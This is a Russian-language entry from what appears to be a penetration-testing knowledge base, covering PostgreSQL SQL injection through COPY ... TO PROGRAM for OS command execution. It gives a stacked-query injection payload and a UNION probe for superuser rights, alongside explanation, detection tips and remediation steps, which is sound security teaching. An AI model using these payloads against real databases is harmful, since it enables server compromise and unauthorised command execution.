---
id: sqli-postgresql-copy-program
title: "PostgreSQL: COPY ... PROGRAM (выполнение команд ОС)"
type: sqli
target: postgresql
category: web
difficulty: advanced
bypass: auth
tags: [sqli, postgresql, rce, copy-program]
tested_on: ["PostgreSQL 13 (суперпользователь)"]
success_rate: 0.3
risk: high
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "privilege-escalation"
    type: leads_to
---

# PostgreSQL: COPY ... PROGRAM (выполнение команд ОС)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'; --
```

## Explanation

С PostgreSQL 9.3 `COPY ... TO/FROM PROGRAM` выполняет команду оболочкой сервера.
Требуется привилегия суперпользователя (или членство в `pg_execute_server_program`),
поэтому это не «инъекция -> RCE» в один шаг, а эскалация при избыточных правах роли.
Работает и stacked-синтаксис, если драйвер его разрешает.

## Detection

Проверка прав: `' UNION SELECT rolsuper, rolname FROM pg_roles --`.
В логах PostgreSQL — `COPY ... PROGRAM`; в логах ОС — процессы, порождённые postgres.

## Remediation

- Роль приложения: `NOSUPERUSER`, без членства в `pg_execute_server_program`.
- Параметризация + отключение multi-statement.
- Изоляция: отдельный контейнер БД, read-only ФС, без shell-утилит в образе.
- Аудит через `pgaudit`.
